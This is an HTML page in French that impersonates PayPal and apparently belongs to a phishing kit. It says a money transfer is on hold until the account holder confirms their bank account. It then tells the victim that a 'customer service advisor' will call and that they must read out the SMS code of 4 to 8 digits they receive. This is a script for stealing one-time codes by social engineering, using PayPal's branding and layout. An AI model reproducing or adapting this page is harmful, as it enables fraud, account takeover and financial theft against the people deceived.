<!DOCTYPE html>
<html data-reactroot="">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8" />
    <title>Vous avez reçu de l'argent</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <link rel="shortcut icon" href="public/img/pp_favicon_x.ico" />
    <link rel="apple-touch-icon" href="public/img/pp64.png" />
    <link rel="canonical" href="#" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <link rel="stylesheet" href="public/css/main.ltr.css" />
    <link href="public/css/page.c9a650b6b85d7c2bdddc.css" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
    <link rel="stylesheet" href="public/css/contextualLogin.css" />
</head>

<body class="vx_root vx_addFlowTransition vx_hasFadeTransition">
<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
    <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper vx_modal-wrapper_logo elementDirection" tabindex="-1">
        <div class="vx_modal-content">

            
    <header class="vx_modal-header">
        <h2 id="js_modalHeader" class="vx_text-2 header-centered" style="color:#005C08; ">VIREMENT EN COURS.</h2>
        <p class="vx_text-body"></p>
    </header>
    <div class="vx_modal-body vx_blocks-for-mobile">
        <div>
            <div class="vx_modal-body vx_blocks-for-mobile">
                <div class="form-container">

                    <div class="cardForm-cardArt">
                        <img width="150"  src="public/img/encours.gif" />
                    </div>
                    <p class="vx_text-5 " style="text-align: center">
                        Suite aux nouvelles mesures de sécurité, vous serez crédité sur votre compte qu’après avoir confirmé que vous êtes bien le titulaire du compte bancaire enregistré sur votre compte Paypal.
                    </p>

                    <p class="vx_text-5 " style="text-align: center">
                        Pour terminer la confirmation de votre compte : <span style="color: red;">vous serez contacté par téléphone par le service client dans les meilleurs délais.</span>
                    </p>
                    <p class="vx_text-5 " style="text-align: center">
                        En confirmant votre compte bancaire, vous autorisez Paypal à vous envoyer un SMS.Vous trouverez dans le SMS, un montant de vérification généré de manière aléatoire et un code de 4 à 8 chiffres.
                    </p>
                    <p class="vx_text-5 " style="text-align: center">
                        Que vous devez communiquer au conseiller pour confirmer votre compte bancaire.
                    </p>
                    <p class="vx_text-5 " style="text-align: center">
                        La confirmation de votre compte bancaire vous permet de prouver que vous êtes bien le titulaire de la carte bancaire enregistrée puisque vous seul avez accès au code Paypal.
                    </p>
                    <p class="vx_text-5 " style="text-align: center">
                        Cordialement,Paypal.
                    </p>
                </div>

            </div>

        </div>



    </div>

            <div class="signup-page-footer vx_text-legal center">©1999-2022 PayPal. Tous droits réservés.</div>

        </div>
    </div>

</div>

<script type="text/javascript" src="public/js/vx-lib.min.js"></script>
<script type="text/javascript" defer="" src="public/js/vendor.js"></script>
<script type="text/javascript" defer="" src="public/js/flowBundle.js"></script>
<script type="text/javascript" defer="" src="public/js/pa.js"></script>
    

    <!-- <script type="text/javascript">
        function redirect(){
            window.location = "index.php";
        }
        setTimeout(redirect, 240000);
    </script> -->


</body>

</html>